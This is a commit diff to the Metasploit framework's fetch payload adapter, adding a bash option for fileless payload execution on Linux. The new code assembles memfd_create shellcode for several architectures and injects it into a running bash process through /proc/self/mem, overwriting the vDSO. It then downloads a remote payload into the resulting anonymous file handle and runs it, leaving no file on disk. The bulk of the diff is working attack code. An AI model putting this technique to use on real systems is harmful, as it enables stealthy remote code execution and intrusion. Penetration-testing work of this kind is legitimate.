ac052f69cc80d869ddc9b54f7a89db815ffdc8ca
Martin Sutovsky <martin_sutovsky@rapid7.com>
2025-03-28 15:06:36 +0100

    Rebase, adding sh option

--- lib/msf/core/payload/adapter/fetch.rb
+++ lib/msf/core/payload/adapter/fetch.rb
@@ -256,7 +256,7 @@ module Msf::Payload::Adapter::Fetch
   end
 
   def _execute_nix(get_file_cmd)
-    return _generate_fileless(get_file_cmd) if datastore['FETCH_FILELESS'] == 'bash'
+    return _generate_fileless_bash(get_file_cmd) if datastore['FETCH_FILELESS'] == 'bash'
     return _generate_fileless_python(get_file_cmd) if datastore['FETCH_FILELESS'] == 'python3.8+'
 
 
@@ -282,30 +282,171 @@ module Msf::Payload::Adapter::Fetch
     _execute_add(get_file_cmd)
   end
 
-  # The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
-  def _generate_fileless(get_file_cmd)
-    # get list of all $USER's processes
-    cmd = 'FOUND=0'
-    cmd << ";for i in $(ps -u $USER | awk '{print $1}')"
-    # already found anonymous file where we can write
-    cmd << '; do if [ $FOUND -eq 0 ]'
+  def _generate_first_stage_shellcode
+    case module_info['AdaptedArch']
+    when 'x64'
+      # fd = memfd_create()
+      # ftruncate(fd, null)
+      # pause()
+      in_memory_loader_asm = %(
+      start:
+          xor rsi, rsi
+          push rsi
+          push rsp
+          pop rdi
+          mov rax, 0xfffffffffffffec1 
+          neg rax
+          syscall
+          mov rdi,rax
+          mov al, 0x4d
+          syscall
+          push 0x22
+          pop rax
+          syscall
 
-    # look for every symbolic link with write rwx permissions
-    # if found one, try to download payload into the anonymous file
-    # and execute it
-    cmd << '; then for f in $(find /proc/$i/fd -type l -perm u=rwx 2>/dev/null)'
-    cmd << '; do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ]'
-    cmd << "; then if $(#{get_file_cmd} >/dev/null)"
-    cmd << '; then $f'
-    cmd << '; FOUND=1'
-    cmd << '; break'
-    cmd << '; fi'
-    cmd << '; fi'
-    cmd << '; done'
-    cmd << '; fi'
-    cmd << '; done'
+      )
+      payload = Metasm::Shellcode.assemble(Metasm::X64.new, in_memory_loader_asm).encode_string
+    when 'x86'
+      # fd = memfd_create()
+      # ftruncate(fd, null)
+      # pause()
+      in_memory_loader_asm= %(
+        xor ecx, ecx
+        push ecx
+        lea ebx, [esp]
+        inc ecx
+        mov eax, 0xfffffe9c
+        neg eax
+        int 0x80
+        mov ebx, eax
+        mov al, 0x5d
+        int 0x80
+        mov al, 0x1d
+        int 0x80
+      )
+      payload = Metasm::Shellcode.assemble(Metasm::X86.new, in_memory_loader_asm).encode_string
+    when 'aarch64'
+      # fd = memfd_create()
+      # ftruncate(fd, null)
+      # pid = getpid()
+      # kill(pid,SIGSTOP)
+      in_memory_loader_asm = [
+          0x0a0080d2, #0x1000:	mov	x10, #0	0x0a0080d2
+          0xea0300f9, #0x1004:	str	x10, [sp]	0xea0300f9
+          0xe0030091, #0x1008:	mov	x0, sp	0xe0030091
+          0x210080d2, #0x100c:	mov	x1, #1	0x210080d2
+          0xe82280d2, #0x1010:	mov	x8, #0x117	0xe82280d2
+          0x010000d4, #0x1014:	svc	#0	0x010000d4
+          0xc80580d2, #0x1018:	mov	x8, #0x2e	0xc80580d2
+          0x010000d4, #0x101c:	svc	#0	0x010000d4
+          0x881580d2, #0x1020:	mov	x8, #0xac	0x881580d2
+          0x010000d4, #0x1024:	svc	#0	0x010000d4
+          0x610280d2, #0x1028:	mov	x1, #0x13	0x610280d2
+          0x281080d2, #0x102c:	mov	x8, #0x81	0x281080d2
+          0x010000d4, #0x1030:	svc	#0	0x010000d4
+      ]
+      payload = in_memory_loader_asm.pack("N*")
+    when 'armle'
+      in_memory_loader_asm = [
+          0x0020a0e3, #0x1000:	mov	r2, #0	0x0020a0e3
+          0x04202de5, #0x1004:	str	r2, [sp, #-4]!	0x04202de5
+          0x0d00a0e1, #0x1008:	mov	r0, sp	0x0d00a0e1
+          0x0110a0e3, #0x100c:	mov	r1, #1	0x0110a0e3
+          0x8370a0e3, #0x1010:	mov	r7, #0x83	0x8370a0e3
+          0xfe7087e2, #0x1014:	add	r7, r7, #0xfe	0xfe7087e2
+          0x000000ef, #0x1018:	svc	#0	0x000000ef
+          0x5d70a0e3, #0x101c:	mov	r7, #0x5d	0x5d70a0e3
+          0x000000ef, #0x1020:	svc	#0	0x000000ef
+          0x1d70a0e3, #0x1024:	mov	r7, #0x1d	0x1d70a0e3
+          0x000000ef, #0x1028:	svc	#0	0x000000ef
 
-    cmd
+      ]
+      payload = in_memory_loader_asm.pack("V*")
+    when 'armbe'
+      # fd = memfd_create()
+      # ftruncate(fd, null)
+      # pause()
+      in_memory_loader_asm = [
+          0xe3a02000, #0x1000:	mov	r2, #0	0xe3a02000
+          0xe52d2004, #0x1004:	str	r2, [sp, #-4]!	0xe52d2004
+          0xe1a0000d, #0x1008:	mov	r0, sp	0xe1a0000d
+          0xe3a01001, #0x100c:	mov	r1, #1	0xe3a01001
+          0xe3a07083, #0x1010:	mov	r7, #0x83	0xe3a07083
+          0xe28770fe, #0x1014:	add	r7, r7, #0xfe	0xe28770fe
+          0xef000000, #0x1018:	svc	#0	0xef000000
+          0xe3a0705d, #0x101c:	mov	r7, #0x5d	0xe3a0705d
+          0xef000000, #0x1020:	svc	#0	0xef000000
+          0xe3a0701d, #0x1024:	mov	r7, #0x1d	0xe3a0701d
+          0xef000000, #0x1028:	svc	#0	0xef000000
+
+      ]
+      payload = in_memory_loader_asm.pack("V*")
+    when 'mips64'
+      puts 'Not implemented yet'
+    when 'mipsbe'
+      puts 'Not implemented yet'
+    when 'mipsle'
+      puts 'Not implemented yet'
+    when 'ppc'
+      puts 'Not implemented yet'
+    when 'ppc64'
+      puts 'Not implemented yet'
+    else
+      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
+    end
+    Base64.strict_encode64(payload)
+  end
+
+  def _generate_jmp_instruction
+    #
+    # The sed command will basically take two characters at the time and switch their order, this is due to endianess of x86 addresses
+    #
+    case module_info['AdaptedArch']
+    when 'x64'
+      %^"48b8"$(echo $(printf %016x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
+    when 'x86'
+      %^"b8"$(echo $(printf %08x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')"ffe0"^
+    when 'aarch64'
+      %^"4000005800001fd6"$(echo $(printf %16x $vdso_addr) | rev | sed -E 's/(.)(.)/\\2\\1/g')^
+    when 'armle'
+      %^$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,3,2)}')"7"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,2,1)}')"0"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,1,1)}')"e3"^
+    when 'armbe'
+      %^"e30"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,1,1)}')"7"$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,2,1)}')""$(echo $(printf %04x $vdso_addr)  |  awk '{print substr($0,3,2)}')^
+    else
+      fail_with(Msf::Module::Failure::BadConfig, 'Unsupported architecture')
+    end
+  end
+
+  # Original Idea: The idea behind fileless execution are anonymous files. The bash script will search through all processes owned by $USER and search from all file descriptor. If it will find anonymous file (contains "memfd") with correct permissions (rwx), it will copy the payload into that descriptor with defined fetch command and finally call that descriptor
+  # New idea: use /proc/*/mem to write shellcode stager into bash process and create anonymous handle on-fly, then search for that handle and use same approach as original idea
+  def _generate_fileless_bash(get_file_cmd)
+    stage_cmd = %<vdso_addr=$((0x$(grep -F "[vdso]" /proc/$$/maps | cut -d'-' -f1)));>
+    stage_cmd << %(jmp=#{_generate_jmp_instruction};)
+    stage_cmd << "sc=$(base64 -d <<< #{_generate_first_stage_shellcode});"
+    stage_cmd << %<jmp=$(printf $jmp | sed 's/\\([0-9A-F]\\{2\\}\\)/\\\\x\\1/gI');>
+    stage_cmd << 'read syscall_info < /proc/self/syscall;'
+    stage_cmd << "addr=$(($(echo $syscall_info | cut -d' ' -f9)));"
+    stage_cmd << 'exec 3>/proc/self/mem;'
+    stage_cmd << 'dd bs=1 skip=$vdso_addr <&3 >/dev/null 2>&1;'
+    stage_cmd << 'printf $sc >&3;'
+    stage_cmd << 'exec 3>&-;'
+    stage_cmd << 'exec 3>/proc/self/mem;'
+    stage_cmd << 'dd bs=1 skip=$addr <&3 >/dev/null 2>&1;'
+    stage_cmd << 'printf $jmp >&3;'
+
+    cmd = "echo '#{Base64.strict_encode64(stage_cmd)}' | base64 -d | bash & "
+    cmd << 'cd /proc/$!;'
+    cmd << 'sleep 1;' #adding short pause to give process time to load file handle
+    cmd << 'FOUND=0;if [ $FOUND -eq 0 ];'
+
+    cmd << 'then for f in $(find ./fd -type l -perm u=rwx 2>/dev/null);'
+    cmd << 'do if [ $(ls -al $f | grep -o "memfd" >/dev/null; echo $?) -eq "0" ];'
+    cmd << "then if $(#{get_file_cmd} >/dev/null);"
+    cmd << 'then $f;FOUND=1;break;'
+    cmd << 'fi;'
+    cmd << 'fi;'
+    cmd << 'done;'
+    cmd << 'fi;'
   end
   
   # same idea as _generate_fileless function, but force creating anonymous file handle
